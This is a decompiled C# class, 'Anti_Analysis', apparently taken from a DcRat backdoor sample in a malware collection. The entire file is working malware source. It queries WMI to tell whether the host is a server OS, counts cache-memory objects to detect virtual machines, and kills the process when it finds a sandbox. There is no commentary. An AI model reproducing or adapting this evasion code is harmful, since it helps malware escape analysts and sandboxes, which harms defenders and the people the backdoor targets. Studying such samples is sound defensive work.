// Decompiled with JetBrains decompiler
// Type: Client.Helper.Anti_Analysis
// Assembly: Hau, Version=1.0.7.0, Culture=neutral, PublicKeyToken=null
// MVID: 43E252B6-B9CE-452D-8541-D8645EC414DC
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Backdoor.MSIL.DcRat.gen-b46a6ed5d0d601aa0e1087095ddea928405c927d65ab795aca3a148d2fb37d13.exe

using System;
using System.Linq;
using System.Management;

namespace Client.Helper
{
  internal class Anti_Analysis
  {
    public static void RunAntiAnalysis()
    {
      if (Anti_Analysis.IsServerOS() || !Anti_Analysis.isVM_by_wim_temper())
        return;
      Environment.FailFast((string) null);
    }

    public static bool IsServerOS()
    {
      try
      {
        string machineName = Environment.MachineName;
        ConnectionOptions options = new ConnectionOptions()
        {
          EnablePrivileges = true,
          Impersonation = ImpersonationLevel.Impersonate
        };
        using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher(new ManagementScope(string.Format("\\\\{0}\\root\\CIMV2", (object) machineName), options), new ObjectQuery("SELECT * FROM Win32_OperatingSystem")))
        {
          using (ManagementObjectCollection source = managementObjectSearcher.Get())
          {
            if (source.Count != 1)
              throw new ManagementException();
            switch ((uint) source.OfType<ManagementObject>().First<ManagementObject>().Properties["ProductType"].Value)
            {
              case 1:
                return false;
              case 2:
                return true;
              case 3:
                return true;
              default:
                return false;
            }
          }
        }
      }
      catch
      {
        return false;
      }
    }

    public static bool isVM_by_wim_temper()
    {
      try
      {
        ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher((ObjectQuery) new SelectQuery("Select * from Win32_CacheMemory"));
        int num = 0;
        foreach (ManagementObject managementObject in managementObjectSearcher.Get())
          ++num;
        return num < 2;
      }
      catch
      {
        return true;
      }
    }
  }
}
